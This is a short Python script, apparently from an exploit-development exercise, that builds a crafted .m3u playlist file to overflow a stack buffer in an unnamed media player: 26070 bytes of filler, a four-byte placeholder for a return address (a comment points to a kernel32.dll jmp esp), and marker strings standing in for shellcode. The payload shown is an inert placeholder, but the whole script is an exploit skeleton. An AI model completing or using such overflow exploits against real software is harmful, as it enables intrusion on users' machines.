import struct
#kernel32.dll jmp esp using fndjump.exe

shellcode = ("1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK" +
"5ABCDEFGHIJK6ABCDEFGHIJK" +
"7ABCDEFGHIJK8ABCDEFGHIJK" +
"9ABCDEFGHIJKAABCDEFGHIJK" +
"BABCDEFGHIJKCABCDEFGHIJK")

buffer = "A"*26070+"B"*4+shellcode

try:
        fl = open("_04_host_shellcode.m3u","w")
        fl.write(buffer)
        fl.close()
except:
        print "failed"
